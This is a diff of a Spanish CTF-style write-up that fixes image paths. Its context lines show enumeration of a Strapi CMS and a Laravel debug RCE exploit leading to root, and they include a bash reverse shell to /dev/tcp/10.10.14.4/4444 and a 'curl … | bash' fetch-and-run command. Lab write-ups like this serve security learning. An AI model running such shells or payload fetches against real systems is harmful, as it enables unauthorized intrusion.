@@ -33,29 +33,29 @@ Nmap done: 1 IP address (1 host up) scanned in 31.53 seconds
 
 ```
 Nmap nos reporta los puertos _22_ y _80_. En la web se esta aplicando Virtual Hosting por lo que añado el dominio al _/etc/hosts_ para me redirija:
-![](/assets/img/AnexosPasted%20image%2020250330152805.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330152805.png)
 
-![](/assets/img/AnexosPasted%20image%2020250330152851.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330152851.png)
 
 Tenemos las siguiente web
 
-![](/assets/img/AnexosPasted%20image%2020250330152910.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330152910.png)
 Con `gobuster` y `ffuf` de primeras no encontré nada por lo que mirando la **devtool** del navegador veo que se esta haciendo una petición a una _.js_:
-![](/assets/img/AnexosPasted%20image%2020250330155932.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330155932.png)
 
 Tenemos lo siguiente:
 
-![](/assets/img/AnexosPasted%20image%2020250330160139.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330160139.png)
 
 Con esta herramienta web pongo el código legible y veo que existe un dominio:
 
-![](/assets/img/AnexosPasted%20image%2020250330160054.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330160054.png)
 
 Lo añado al _/etc/hosts_ para que me resuelva:
-![](/assets/img/AnexosPasted%20image%2020250330160229.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330160229.png)
 
 Tenemos la siguiente web:
-![](/assets/img/AnexosPasted%20image%2020250330160303.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330160303.png)
 
 
 Para este nuevo dominio ejecuto `gobuster` y me reporta lo siguiente: 
@@ -84,12 +84,12 @@ Starting gobuster in directory enumeration mode
 ```
 
 Tenemos una lista de usuarios:
-![](/assets/img/AnexosPasted%20image%2020250330160643.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330160643.png)
 
 En _/admin_ tenemos un Login y vemos que se esta usando **Strapi CMS**:
-![](/assets/img/AnexosPasted%20image%2020250330160429.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330160429.png)
 
-![](/assets/img/AnexosPasted%20image%2020250330160950.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330160950.png)
 ## Explotación
 
 Buscamos exploits para Strapi y como solo hay para una versión, podemos probar:
@@ -140,7 +140,7 @@ Ejecutamos el exploit y funciona, podemos ejecutar código pero a ciegas:
 Confirmamos que la ejecución funciona:
 
 
-![](/assets/img/AnexosPasted%20image%2020250330162114.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330162114.png)
 
 En mi caso, no me dejaba hacerlo `/bin/bash -i >& /dev/tcp/10.10.14.4/4444 0>&1` por lo que me monto un servidor con `pyhton` donde tengo el siguiente archivo.
 
@@ -154,7 +154,7 @@ Me pongo a la escucha a la par con `netcat` y ejecuto:
 curl http://10.10.14.4/bash.sh |bash 
 ```
 
-![](/assets/img/AnexosPasted%20image%2020250330162358.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330162358.png)
 
 
 
@@ -367,7 +367,7 @@ Ahora podemos hacer Port Forwarding correctamente:
 ```
 
 Tenemos esta página por el puerto 8000:
-![](/assets/img/AnexosPasted%20image%2020250330165519.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330165519.png)
 
 Aplicamos `gobuster`:
 ```shell 
@@ -390,7 +390,7 @@ Starting gobuster in directory enumeration mode
 ```
 
 Me detecta el directorio _profiles/_:
-![](/assets/img/AnexosPasted%20image%2020250330194655.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330194655.png)
 
 Buscando encontré que Laravel Debug es vulnerable a RCE por lo que pruebo con este POC de github: 
 
@@ -430,4 +430,4 @@ uid=0(root) gid=0(root) groups=0(root)
 [+] Logs cleared
 ```
 Ejecuto el exploit y estamos dentro como root:
-![](/assets/img/AnexosPasted%20image%2020250330170821.png)
+![](/assets/img/Anexos/Pasted%20image%2020250330170821.png)
